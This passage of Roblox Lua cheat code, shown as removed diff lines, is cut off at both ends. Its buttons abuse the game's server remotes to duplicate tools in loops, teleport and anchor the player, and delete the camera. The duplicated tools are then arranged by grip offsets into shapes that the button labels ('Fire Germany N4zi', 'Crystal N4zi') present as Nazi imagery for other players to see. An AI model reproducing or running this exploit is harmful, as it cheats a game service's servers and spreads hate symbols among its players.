-                                                        for basc,aijfw in pairs(toollel:GetDescendants()) do
-                                                                if aijfw.Name == "Handle" then
-                                                                        aijfw.Name = "Hâ¥aâ¥nâ¥dâ¥lâ¥e"
-                                                                        toollel.Parent = game.Players.LocalPlayer.Backpack
-                                                                toollel.Parent = game.Players.LocalPlayer.Character
-                                                                tollllahhhh = toollel
-                                                                task.wait()
-                                                        end
-                                                end
-                                        else toollllfoun2 = false
-                                        end
-                                end
-                        end
-                                for fiifi,toollll in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
-                                        if toollll:IsA("Tool") then
-                                                if toollll.Name == toolselcted then
-                                                        toollllfoun = true
-                                                        for nana,jjsjsj in pairs(toollll:GetDescendants()) do
-                                                                if jjsjsj.Name == "Handle" then
-                                                                        toollll.Parent = game.Players.LocalPlayer.Character
-                                                wait()
-                                                jjsjsj.Name = "Hâ¥aâ¥nâ¥dâ¥lâ¥e"
-                                                toollll.Parent = game.Players.LocalPlayer.Backpack
-                                                toollll.Parent = game.Players.LocalPlayer.Character
-                                                toolllffel = toollll
-                                                                end
-                                                        end
-                                                else toollllfoun = false
-                                        end
-                                end
-                                end
-                                if toollllfoun == true then
-                                                                        if game.Players.LocalPlayer.Character:FindFirstChild(toolllffel) == nil then  toollllfoun = false end
-                                repeat wait() until game.Players.LocalPlayer.Character:FindFirstChild(toolllffel) == nil
-                                toollllfoun = false
-                                end
-                                if toollllfoun2 == true then
-                                        if game.Players.LocalPlayer.Character:FindFirstChild(tollllahhhh) == nil then toollllfoun2 = false end
-                                        repeat wait() until game.Players.LocalPlayer.Character:FindFirstChild(tollllahhhh) == nil
-                                        toollllfoun2 = false
-                                end
-                                wait(1)
-                                for m=1, dupeamot do
-                                        if duping == false then game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false return end
-                                        if game:GetService("Workspace"):FindFirstChild("Camera") then
-                                                game:GetService("Workspace"):FindFirstChild("Camera"):Destroy() end
-                                                if m <= dupeamot then
-                elseif m == dupeamot or m >= dupeamot - 1 then
-                end
-                                        local args = {
-                                                [1] = "PickingTools",
-                                                [2] = toolselcted
-                                        }
-                                        
-                                        picktoolremote:InvokeServer(unpack(args))
-                                        game:GetService("Players").LocalPlayer.Backpack:WaitForChild(toolselcted).Parent = game.Players.LocalPlayer.Character
-                                        if duping == false then game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false return end
-                                        wait()
-                                        game:GetService("Players").LocalPlayer.Character[toolselcted]:FindFirstChild("Handle").Name = "Hâ¥aâ¥nâ¥dâ¥lâ¥e"
-                                        game:GetService("Players").LocalPlayer.Character:FindFirstChild(toolselcted).Parent = game.Players.LocalPlayer.Backpack
-                                        game:GetService("Players").LocalPlayer.Backpack:FindFirstChild(toolselcted).Parent = game.Players.LocalPlayer.Character
-                                        repeat         if game:GetService("Workspace"):FindFirstChild("Camera") then
-                                                game:GetService("Workspace"):FindFirstChild("Camera"):Destroy() end
-                                                 task.wait() until
-                                                 game:GetService("Players").LocalPlayer.Character:FindFirstChild(toolselcted) == nil
-                                end
-                                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
-                                repeat wait() until game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") == nil
-                                repeat wait() until game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldcf
-                                for z,x in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
-                                        if x.Name == toolselcted then
-                                                toolamouth = z
-                                        end
-                                end
-                                wait()
-                                duping = false
-   wait(1)
-
-
-local TablaGripPos = {
-                      Vector3.new(0, 3, 6),
-                      Vector3.new(1, 3, 6),
-                      Vector3.new(2, 3, 6),
-                      Vector3.new(3, 3, 6),
-                      Vector3.new(4, 3, 6),
-                      Vector3.new(5, 3, 6),
-                      Vector3.new(6, 3, 6),
-                      Vector3.new(0, 3, 17),
-                      Vector3.new(1, 3, 17),
-                      Vector3.new(2, 3, 17),
-                      Vector3.new(3, 3, 17),
-                      Vector3.new(4, 3, 17),
-                      Vector3.new(5, 3, 17),
-                      Vector3.new(6, 3, 17),
-                      Vector3.new(0, 3, 30),
-                      Vector3.new(1, 3, 30),
-                      Vector3.new(2, 3, 30),
-                      Vector3.new(3, 3, 30),
-                      Vector3.new(4, 3, 30),
-                      Vector3.new(5, 3, 30),
-                      Vector3.new(6, 3, 30),
-                      Vector3.new(0, 3, 43),
-                      Vector3.new(1, 3, 43),
-                      Vector3.new(2, 3, 43),
-                      Vector3.new(3, 3, 43),
-                      Vector3.new(4, 3, 43),
-                      Vector3.new(5, 3, 43),
-                      Vector3.new(6, 3, 43),
-                      Vector3.new(0, 3, 55),
-                      Vector3.new(1, 3, 55),
-                      Vector3.new(2, 3, 55),
-                      Vector3.new(3, 3, 55),
-                      Vector3.new(4, 3, 55),
-                      Vector3.new(5, 3, 55),
-                      Vector3.new(6, 3, 55),
-                      Vector3.new(-1 , 3, 6),
-                      Vector3.new(-2 , 3, 6),
-                      Vector3.new(-3 , 3, 6),
-                      Vector3.new(-4 , 3, 6),
-                      Vector3.new(-5 , 3, 6),
-                      Vector3.new(-6 , 3, 6),
-                      Vector3.new(-7 , 3, 6),
-                      Vector3.new(-8 , 3, 6),
-                      Vector3.new(-9 , 3, 6),
-                      Vector3.new(-10 , 3, 6),
-                      Vector3.new(-11 , 3, 6),
-                      Vector3.new(-12 , 3, 6),
-                      Vector3.new(-13 , 3, 6),
-                      Vector3.new(-14 , 3, 6),
-                      Vector3.new(-15 , 3, 6),
-                      Vector3.new(-16 , 3, 6),
-                      Vector3.new(-17 , 3, 6),
-                      Vector3.new(-18 , 3, 6),
-                      Vector3.new(-19 , 3, 6),
-                      Vector3.new(-20 , 3, 6),
-                      Vector3.new(-21 , 3, 6),
-                      Vector3.new(1 , 3, 55),
-                      Vector3.new(2 , 3, 55),
-                      Vector3.new(3 , 3, 55),
-                      Vector3.new(4 , 3, 55),
-                      Vector3.new(5 , 3, 55),
-                      Vector3.new(6 , 3, 55),
-                      Vector3.new(7 , 3, 55),
-                      Vector3.new(8 , 3, 55),
-                      Vector3.new(9 , 3, 55),
-                      Vector3.new(10 , 3, 55),
-                      Vector3.new(11 , 3, 55),
-                      Vector3.new(12 , 3, 55),
-                      Vector3.new(13 , 3, 55),
-                      Vector3.new(14 , 3, 55),
-                      Vector3.new(15 , 3, 55),
-                      Vector3.new(16 , 3, 55),
-                      Vector3.new(17 , 3, 55),
-                      Vector3.new(18 , 3, 55),
-                      Vector3.new(19 , 3, 55),
-                      Vector3.new(20 , 3, 55),
-                      Vector3.new(21 , 3, 55),
-                      Vector3.new(22 , 3, 55),
-                      Vector3.new(-16, 3, 43),
-                                   Vector3.new(-17, 3, 43),
-                      Vector3.new(-18, 3, 43),
-                      Vector3.new(-19, 3, 43),
-                      Vector3.new(-20, 3, 43),
-                      Vector3.new(-21, 3, 43),
-                      Vector3.new(-16, 3, 43),
-                      Vector3.new(-15, 3, 43),
-                      Vector3.new(-16, 3, 43),
-                                                Vector3.new(-17, 3, 55),
-                      Vector3.new(-18, 3, 55),
-                      Vector3.new(-19, 3, 55),
-                      Vector3.new(-20, 3, 55),
-                      Vector3.new(-21, 3, 55),
-                      Vector3.new(-16, 3, 55),
-                      Vector3.new(-15, 3, 55),
-                      Vector3.new(0, 3, 55),
-                      Vector3.new(1, 3, 55),
-                      Vector3.new(2, 3, 55),
-                      Vector3.new(3, 3, 55),
-                      Vector3.new(4, 3, 55),
-                      Vector3.new(5, 3, 55),
-                      Vector3.new(6, 3, 55),
-         Vector3.new(23 , 3, 55),
-         Vector3.new(24 , 3, 55),
-          Vector3.new(25 , 3, 55),
-           Vector3.new(26 , 3, 55),
-            Vector3.new(27 , 3, 55),
-                         Vector3.new(-1 , 3, 30),
-                      Vector3.new(-2 , 3, 30),
-                      Vector3.new(-3 , 3, 30),
-                      Vector3.new(-4 , 3, 30),
-                      Vector3.new(-5 , 3, 30),
-                      Vector3.new(-6 , 3, 30),
-                      Vector3.new(-7 , 3, 30),
-                      Vector3.new(-8 , 3, 30),
-                      Vector3.new(-9 , 3, 30),
-                      Vector3.new(-10 , 3, 30),
-                      Vector3.new(-11 , 3, 30),
-                      Vector3.new(-12 , 3, 30),
-                      Vector3.new(-13 , 3, 30),
-                      Vector3.new(-14 , 3, 30),
-                      Vector3.new(-15 , 3, 30),
-                      Vector3.new(-16 , 3, 30),
-                      Vector3.new(-17 , 3, 30),
-                      Vector3.new(-18 , 3, 30),
-                      Vector3.new(-19 , 3, 30),
-                      Vector3.new(-20 , 3, 30),
-                      Vector3.new(-21 , 3, 30),
-                          Vector3.new(1 , 3, 30),
-                      Vector3.new(2 , 3, 30),
-                      Vector3.new(3 , 3, 30),
-                      Vector3.new(4 , 3, 30),
-                      Vector3.new(5 , 3, 30),
-                      Vector3.new(6 , 3, 30),
-                      Vector3.new(7 , 3, 30),
-                      Vector3.new(8 , 3, 30),
-                      Vector3.new(9 , 3, 30),
-                      Vector3.new(10 , 3, 30),
-                      Vector3.new(11 , 3, 30),
-                      Vector3.new(12 , 3, 30),
-                      Vector3.new(13 , 3, 30),
-                      Vector3.new(14 , 3, 30),
-                      Vector3.new(15 , 3, 30),
-                      Vector3.new(16 , 3, 30),
-                      Vector3.new(17 , 3, 30),
-                      Vector3.new(18 , 3, 30),
-                      Vector3.new(19 , 3, 30),
-                      Vector3.new(20 , 3, 30),
-                      Vector3.new(21 , 3, 30),
-                      Vector3.new(22 , 3, 30),
-                      Vector3.new(23 , 3, 30),
-                      Vector3.new(24 , 3, 30),
-                      Vector3.new(25 , 3, 30),
-                      Vector3.new(26 , 3, 30),
-                      Vector3.new(27 , 3, 30),
-                      Vector3.new(28 , 3, 30),
-                      Vector3.new(28, 3, 6),
-                      Vector3.new(27, 3, 6),
-                      Vector3.new(26, 3, 6),
-                      Vector3.new(25, 3, 6),
-                      Vector3.new(24, 3, 6),
-                      Vector3.new(23, 3, 6),
-                      Vector3.new(22, 3, 6),
-                      Vector3.new(21, 3, 6),
-                      Vector3.new(21, 3, 17),
-                      Vector3.new(22, 3, 17),
-                      Vector3.new(23, 3, 17),
-                      Vector3.new(24, 3, 17),
-                      Vector3.new(25, 3, 17),
-                      Vector3.new(26, 3, 17),
-                      Vector3.new(27, 3, 17),
-                      Vector3.new(28, 3, 17),
-                         }
-                          for i, tool in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
-                              if tool:IsA("Tool") then
-                                  tool.Parent = game.Players.LocalPlayer.Character
-                                  
-                                  local gripPosIndex = math.min(i, #TablaGripPos)
-                                  local gripPos = TablaGripPos[gripPosIndex]
-                          
-                                  if tool:IsDescendantOf(game.Players.LocalPlayer.Character) then
-                                      tool.GripPos = gripPos
-                                  else
-                                  end
-                              end
-                          end
-    end
-})
-
-ToolsTab:AddButton({
-    Name = "Fire Germany N4zi",
-    Callback = function()
-        local nametools = "Crystal N4zi Lel"
-        local oldcframe = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
-        game:GetService("StarterGui"):SetCore("SendNotification", {
-            Title = "Warn!",
-            Text = "Please do not equip any tools or unequip tools or click tools on inventory. It will break the script.",
-            Button1 = "I understand",
-            Duration = 5
-        })
-        local toolthatiwanttodupe = "PaperbagFire"
-        local tools = "PaperbagFire"
-        if game.Players.LocalPlayer.Character.Humanoid.Sit == true then
-            task.wait()
-            game.Players.LocalPlayer.Character.Humanoid.Sit = false
-        end
-        wait(0.1)
-        local args = {
-            [1] = "ClearAllTools"
-        }
-        cleartoolremote:FireServer(unpack(args))
-        if game:GetService("Workspace"):FindFirstChild("Camera") then
-            game:GetService("Workspace"):FindFirstChild("Camera"):Destroy()
-        end
-        for m = 1, 2 do
-            task.wait()
-            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(999999999.414, -490, 999999999.414, 0.974360406, -0.175734088, 0.14049761, -0.133441404, 0.0514053069, 0.989722729, -0.181150302, -0.983094692, 0.0266370922)
-        end
-        task.wait(0.2)
-        game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
-        wait(0.3)
-        local duping = true
-        for m = 1, 57 do
-            if duping == false then
-                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
-                return
-            end
-            if game:GetService("Workspace"):FindFirstChild("Camera") then
-                game:GetService("Workspace"):FindFirstChild("Camera"):Destroy()
-            end
-            local args = {
-                [1] = "PickingTools",
-                [2] = toolthatiwanttodupe
-            }
-            picktoolremote:InvokeServer(unpack(args))
-            game:GetService("Players").LocalPlayer.Backpack:WaitForChild(toolthatiwanttodupe).Parent = game.Players.LocalPlayer.Character
-            if duping == false then
-                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
-                return
-            end
-            wait()
-            game:GetService("Players").LocalPlayer.Character[toolthatiwanttodupe]:FindFirstChild("Handle").Name = "Hândlê"
-            game:GetService("Players").LocalPlayer.Character:FindFirstChild(toolthatiwanttodupe).Parent = game.Players.LocalPlayer.Backpack
-            game:GetService("Players").LocalPlayer.Backpack:FindFirstChild(toolthatiwanttodupe).Parent = game.Players.LocalPlayer.Character
-            repeat
-                if game:GetService("Workspace"):FindFirstChild("Camera") then
-                    game:GetService("Workspace"):FindFirstChild("Camera"):Destroy()
-                end
-                wait()
-            until game:GetService("Players").LocalPlayer.Character:FindFirstChild(toolthatiwanttodupe) == nil
-        end
-        game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
-        repeat wait() until game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") == nil
-        repeat wait() until game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-        local toolgrip = true
-        duping = false
-        wait()
-        local gripBase = CFrame.new(-0.290086746, 0.0755810738, -0.0109872818, 0.0439560413, 0.509705901, -0.859225094, -0.0591450632, -0.857220173, -0.511542261, -0.997281134, 0.0733042806, -0.00753343105)
-        local gripPositions = {
-            Vector3.new(0, 0, 0), Vector3.new(0, 0.5, 0), Vector3.new(0, 1, 0), Vector3.new(0, 1.5, 0),
-            Vector3.new(0, 2, 0), Vector3.new(0, 2.5, 0), Vector3.new(0, 3, 0), Vector3.new(0, 3.5, 0),
-            Vector3.new(0, 4, 0), Vector3.new(0, 4.5, 0), Vector3.new(0, 5, 0), Vector3.new(0, 5, -1),
-            Vector3.new(0, 5, -2), Vector3.new(0, 5, -3), Vector3.new(0, 5, -4), Vector3.new(0, 5, -5),
-            Vector3.new(0, 5, -6), Vector3.new(0, 5, -7), Vector3.new(0, 5, -8), Vector3.new(0, 5, -9),
-            Vector3.new(0, 5, -10), Vector3.new(0, 5.5, -10), Vector3.new(0, 6, -10), Vector3.new(0, 6.5, -10),
-            Vector3.new(0, 7, -10), Vector3.new(0, 7.5, -10), Vector3.new(0, 8, -10), Vector3.new(0, 8.5, -10),
-            Vector3.new(0, 9, -10), Vector3.new(0, 9.5, -10), Vector3.new(0, 10, -10), Vector3.new(0, 10, -5),
-            Vector3.new(0, 10, -4.5), Vector3.new(0, 10, -4), Vector3.new(0, 10, -3.5), Vector3.new(0, 10, -3),
-            Vector3.new(0, 10, -2.5), Vector3.new(0, 10, -2), Vector3.new(0, 10, -1.5), Vector3.new(0, 10, -1),
-            Vector3.new(0, 10, -0.5), Vector3.new(0, 10, 0), Vector3.new(0, 9, -5), Vector3.new(0, 8, -5),
-            Vector3.new(0, 7, -5), Vector3.new(0, 6, -5), Vector3.new(0, 5, -5), Vector3.new(0, 4, -5),
-            Vector3.new(0, 3, -5), Vector3.new(0, 2, -5), Vector3.new(0, 1, -5), Vector3.new(0, 0, -5),
-            Vector3.new(0, 0, -10), Vector3.new(0, 0, -9), Vector3.new(0, 0, -8), Vector3.new(0, 0, -7),
-            Vector3.new(0, 0, -6)
-        }
-        for _, pos in ipairs(gripPositions) do
-            game.Players.LocalPlayer.Backpack[tools].Grip = gripBase + pos
-            game.Players.LocalPlayer.Backpack[tools].Name = nametools
-        end
-        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldcframe
-        wait(0.5)
-        for _, tool in ipairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
-            if tool:IsA("Tool") and tool.Name == nametools then
-                tool.Parent = game:GetService("Players").LocalPlayer.Character
-            end
-        end
-    end
-})
-
-ToolsTab:AddButton({
-    Name = "Crystal N4zi",
-    Callback = function()
-        local nametools = "Crystal N4zi Lel"
-        local oldcframe = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
-        game:GetService("StarterGui"):SetCore("SendNotification", {
-            Title = "Warn!",
-            Text = "Please do not equip any tools or unequip tools or click tools on inventory. It will break the script.",
-            Button1 = "I understand",
-            Duration = 5
-        })
-        local toolthatiwanttodupe = "Crystal"
-        local tools = "Crystal"
-        if game.Players.LocalPlayer.Character.Humanoid.Sit == true then
-            task.wait()
-            game.Players.LocalPlayer.Character.Humanoid.Sit = false
-        end
-        wait(0.1)
-        local args = {
-            [1] = "ClearAllTools"
-        }
-        cleartoolremote:FireServer(unpack(args))
-        if game:GetService("Workspace"):FindFirstChild("Camera") then
-            game:GetService("Workspace"):FindFirstChild("Camera"):Destroy()
-        end
-        for m = 1, 2 do
-            task.wait()
-            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(999999999.414, -490, 999999999.414, 0.974360406, -0.175734088, 0.14049761, -0.133441404, 0.0514053069, 0.989722729, -0.181150302, -0.983094692, 0.0266370922)
-        end
-        task.wait(0.2)
-        game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
-        wait(0.3)
-        local duping = true
-        for m = 1, 57 do
-            if duping == false then
-                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
-                return
-            end
-            if game:GetService("Workspace"):FindFirstChild("Camera") then
-                game:GetService("Workspace"):FindFirstChild("Camera"):Destroy()
-            end
-            local args = {
-                [1] = "PickingTools",
-                [2] = toolthatiwanttodupe
-            }
-            picktoolremote:InvokeServer(unpack(args))
-            game:GetService("Players").LocalPlayer.Backpack:WaitForChild(toolthatiwanttodupe).Parent = game.Players.LocalPlayer.Character
-            if duping == false then
-                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
-                return
-            end
-            wait()
-            game:GetService("Players").LocalPlayer.Character[toolthatiwanttodupe]:FindFirstChild("Handle").Name = "Hândlê"
-            game:GetService("Players").LocalPlayer.Character:FindFirstChild(toolthatiwanttodupe).Parent = game.Players.LocalPlayer.Backpack
-            game:GetService("Players").LocalPlayer.Backpack:FindFirstChild(toolthatiwanttodupe).Parent = game.Players.LocalPlayer.Character
-            repeat
-                if game:GetService("Workspace"):FindFirstChild("Camera") then
-                    game:GetService("Workspace"):FindFirstChild("Camera"):Destroy()
-                end
-                wait()
-            until game:GetService("Players").LocalPlayer.Character:FindFirstChild(toolthatiwanttodupe) == nil
-        end
-        game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
-        repeat wait() until game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") == nil
-        repeat wait() until game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-        local toolgrip = true
-        duping = false
-        wait()
-        local gripBase = CFrame.new(-0.290086746, 0.0755810738, -0.0109872818, 0.0439560413, 0.509705901, -0.859225094, -0.0591450632, -0.857220173, -0.511542261, -0.997281134, 0.0733042806, -0.00753343105)
-        local gripPositions = {
-            Vector3.new(0, 0, 0), Vector3.new(0, 0.5, 0), Vector3.new(0, 1, 0), Vector3.new(0, 1.5, 0),
-            Vector3.new(0, 2, 0), Vector3.new(0, 2.5, 0), Vector3.new(0, 3, 0), Vector3.new(0, 3.5, 0),
-            Vector3.new(0, 4, 0), Vector3.new(0, 4.5, 0), Vector3.new(0, 5, 0), Vector3.new(0, 5, -1),
-            Vector3.new(0, 5, -2), Vector3.new(0, 5, -3), Vector3.new(0, 5, -4), Vector3.new(0, 5, -5),
-            Vector3.new(0, 5, -6), Vector3.new(0, 5, -7), Vector3.new(0, 5, -8), Vector3.new(0, 5, -9),
-            Vector3.new(0, 5, -10), Vector3.new(0, 5.5, -10), Vector3.new(0, 6, -10), Vector3.new(0, 6.5, -10),
-            Vector3.new(0, 7, -10), Vector3.new(0, 7.5, -10), Vector3.new(0, 8, -10), Vector3.new(0, 8.5, -10),
-            Vector3.new(0, 9, -10), Vector3.new(0, 9.5, -10), Vector3.new(0, 10, -10), Vector3.new(0, 10, -5),
-            Vector3.new(0, 10, -4.5), Vector3.new(0, 10, -4), Vector3.new(0, 10, -3.5), Vector3.new(0, 10, -3),
-            Vector3.new(0, 10, -2.5), Vector3.new(0, 10, -2), Vector3.new(0, 10, -1.5), Vector3.new(0, 10, -1),
-            Vector3.new(0, 10, -0.5), Vector3.new(0, 10, 0), Vector3.new(0, 9, -5), Vector3.new(0, 8, -5),
-            Vector3.new(0, 7, -5), Vector3.new(0, 6, -5), Vector3.new(0, 5, -5), Vector3.new(0, 4, -5),
-            Vector3.new(0, 3, -5), Vector3.new(0, 2, -5), Vector3.new(0, 1, -5), Vector3.new(0, 0, -5),
-            Vector3.new(0, 0, -10), Vector3.new(0, 0, -9), Vector3.new(0, 0, -8), Vector3.new(0, 0, -7),
-            Vector3.new(0, 0, -6)
-        }
-        for _, pos in ipairs(gripPositions) do
-            game.Players.LocalPlayer.Backpack[tools].Grip = gripBase + pos
-            game.Players.LocalPlayer.Backpack[tools].Name = nametools
-        end
-        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldcframe
-        wait(0.5)
-        for _, tool in ipairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
-            if tool:IsA("Tool") and tool.Name == nametools then
-                tool.Parent = game:GetService("Players").LocalPlayer.Character
-            end
-        end
-    end
-})
-
-ToolsTab:AddButton({
-    Name = "FireX N4zi",
-    Callback = function()
-        local nametools = "N4zi FireX Lel"
-        local oldcframe = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
-        game:GetService("StarterGui"):SetCore("SendNotification", {
-            Title = "Warn!",
-            Text = "Please do not equip any tools or unequip tools or click tools on inventory. It will break the script.",
-            Button1 = "I understand",
-            Duration = 5
-        })
-        local toolthatiwanttodupe = "FireX"
-        local tools = "FireX"
-        if game.Players.LocalPlayer.Character.Humanoid.Sit == true then
-            task.wait()
-            game.Players.LocalPlayer.Character.Humanoid.Sit = false
-        end
-        wait(0.1)
-        local args = {
-            [1] = "ClearAllTools"
-        }
-        cleartoolremote:FireServer(unpack(args))
-        if game:GetService("Workspace"):FindFirstChild("Camera") then
-            game:GetService("Workspace"):FindFirstChild("Camera"):Destroy()
-        end
-        for m = 1, 2 do
-            task.wait()
-            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(999999999.414, -490, 999999999.414, 0.974360406, -0.175734088, 0.14049761, -0.133441404, 0.0514053069, 0.989722729, -0.181150302, -0.983094692, 0.0266370922)
-        end
-        task.wait(0.2)
-        game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
-        wait(0.3)
-        local duping = true
-        for m = 1, 71 do
-            if duping == false then
-                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
-                return
-            end
-            if game:GetService("Workspace"):FindFirstChild("Camera") then
-                game:GetService("Workspace"):FindFirstChild("Camera"):Destroy()
-            end
-            local args = {
-                [1] = "PickingTools",
-                [2] = toolthatiwanttodupe
-            }
-            picktoolremote:InvokeServer(unpack(args))
-            game:GetService("Players").LocalPlayer.Backpack:WaitForChild(toolthatiwanttodupe).Parent = game.Players.LocalPlayer.Character
-            if duping == false then
-                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
-                return
-            end
-            wait()
-            game:GetService("Players").LocalPlayer.Character[toolthatiwanttodupe]:FindFirstChild("Handle").Name = "Hândlê"
-            game:GetService("Players").LocalPlayer.Character:FindFirstChild(toolthatiwanttodupe).Parent = game.Players.LocalPlayer.Backpack
-            game:GetService("Players").LocalPlayer.Backpack:FindFirstChild(toolthatiwanttodupe).Parent = game.Players.LocalPlayer.Character
-            repeat
-                if game:GetService("Workspace"):FindFirstChild("Camera") then
-                    game:GetService("Workspace"):FindFirstChild("Camera"):Destroy()
-                end
-                wait()
-            until game:GetService("Players").LocalPlayer.Character:FindFirstChild(toolthatiwanttodupe) == nil
-        end
-        game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
-        repeat wait() until game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") == nil
-        repeat wait() until game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-        local toolgrip = true
-        duping = false
-        wait()
-        local gripBase = CFrame.new(0.0538333468, -0.264812469, -0.0177594293, 0.999998629, 0, 0.00164011808, 0, 1, 0, -0.00164011808, 0, 0.999998629)
-        local gripPositions = {
-            Vector3.new(0, -2, 0), Vector3.new(0, -4, 0), Vector3.new(0, -6, 0), Vector3.new(0, -8, 0),
-            Vector3.new(0, -10, 0), Vector3.new(0, -12, 0), Vector3.new(0, -14, 0), Vector3.new(1, -14, 0),
-            Vector3.new(2, -14, 0), Vector3.new(3, -14, 0), Vector3.new(4, -14, 0), Vector3.new(5, -14, 0),
-            Vector3.new(6, -14, 0), Vector3.new(7, -14, 0), Vector3.new(8, -14, 0), Vector3.new(9, -14, 0),
-            Vector3.new(10, -14, 0), Vector3.new(11, -14, 0), Vector3.new(12, -14, 0), Vector3.new(13, -14, 0),
-            Vector3.new(14, -14, 0), Vector3.new(15, -14, 0), Vector3.new(16, -14, 0), Vector3.new(17, -14, 0),
-            Vector3.new(18, -14, 0), Vector3.new(19, -14, 0), Vector3.new(20, -14, 0), Vector3.new(20, -16, 0),
-            Vector3.new(20, -18, 0), Vector3.new(20, -20, 0), Vector3.new(20, -22, 0), Vector3.new(20, -24, 0),
-            Vector3.new(20, -26, 0), Vector3.new(20, -28, 0), Vector3.new(20, -30, 0), Vector3.new(10, -30, 0),
-            Vector3.new(10, -28, 0), Vector3.new(10, -26, 0), Vector3.new(10, -24, 0), Vector3.new(10, -22, 0),
-            Vector3.new(10, -20, 0), Vector3.new(10, -18, 0), Vector3.new(10, -16, 0), Vector3.new(10, -14, 0),
-            Vector3.new(10, -12, 0), Vector3.new(10, -10, 0), Vector3.new(10, -8, 0), Vector3.new(10, -6, 0),
-            Vector3.new(10, -4, 0), Vector3.new(10, -2, 0), Vector3.new(11, -2, 0), Vector3.new(12, -2, 0),
-            Vector3.new(13, -2, 0), Vector3.new(14, -2, 0), Vector3.new(15, -2, 0), Vector3.new(16, -2, 0),
-            Vector3.new(17, -2, 0), Vector3.new(18, -2, 0), Vector3.new(19, -2, 0), Vector3.new(20, -2, 0),
-            Vector3.new(1, -30, 0), Vector3.new(0, -30, 0), Vector3.new(2, -30, 0), Vector3.new(3, -30, 0),
-            Vector3.new(4, -30, 0), Vector3.new(5, -30, 0), Vector3.new(6, -30, 0), Vector3.new(7, -30, 0),
-            Vector3.new(8, -30, 0), Vector3.new(9, -30, 0)
-        }
-        for _, pos in ipairs(gripPositions) do
-            game.Players.LocalPlayer.Backpack[tools].Grip = gripBase + pos
-            game.Players.LocalPlayer.Backpack[tools].Name = nametools
-        end
-        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldcframe
-        wait(0.5)
-        for _, tool in ipairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
-            if tool:IsA("Tool") and tool.Name == nametools then
-                tool.Parent = game:GetService("Players").LocalPlayer.Character
-            end
-        end
-    end
-})
-
-Section = ToolsTab:AddSection({
-    Name = "Aura Grip"
-})
-
-ToolsTab:AddButton({
-    Name = "Couch Aura",
-    Callback = function()
-    nametools = "Couch Spray Lel"
-                oldcframe = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
-game:GetService("StarterGui"):SetCore("SendNotification",{Title="Warn!",Text="Please do not equip any tools or unequip tools or click tools on inventory. It will break the script.", Button1 = "I understand" ,Duration=5})
-                toolthatiwanttodupe = "Couch"
-                tools = "Couch"
-                if game.Players.LocalPlayer.Character.Humanoid.Sit == true then
-                        task.wait()
-                        game.Players.LocalPlayer.Character.Humanoid.Sit = false
-                end
-                wait(0.1)
-                local args = {
-                        [1] = "ClearAllTools"
-                }
-                
-                cleartoolremote:FireServer(unpack(args))
-                if game:GetService("Workspace"):FindFirstChild("Camera") then
-                        game:GetService("Workspace"):FindFirstChild("Camera"):Destroy() end
-                for m=1,2 do task.wait()
-                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(999999999.414, -490, 999999999.414, 0.974360406, -0.175734088, 0.14049761, -0.133441404, 0.0514053069, 0.989722729, -0.181150302, -0.983094692, 0.0266370922)
-                        end
-                        task.wait(0.2)
-                        game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
-                wait(0.3)
-                duping = true
-                for m=1, 124 do
-                        if duping == false then game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false return end
-                        if game:GetService("Workspace"):FindFirstChild("Camera") then
-                                game:GetService("Workspace"):FindFirstChild("Camera"):Destroy() end
-                        local args = {
-                                [1] = "PickingTools",
-                                [2] = toolthatiwanttodupe
-                        }
-                        
-                        picktoolremote:InvokeServer(unpack(args))
-                        game:GetService("Players").LocalPlayer.Backpack:WaitForChild(toolthatiwanttodupe).Parent = game.Players.LocalPlayer.Character
-                        if duping == false then game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false return end
-                        wait()
-                        game:GetService("Players").LocalPlayer.Character[toolthatiwanttodupe]:FindFirstChild("Handle").Name = "HÃ¢ÂÂ¥aÃ¢ÂÂ¥nÃ¢ÂÂ¥dÃ¢ÂÂ¥lÃ¢ÂÂ¥e"
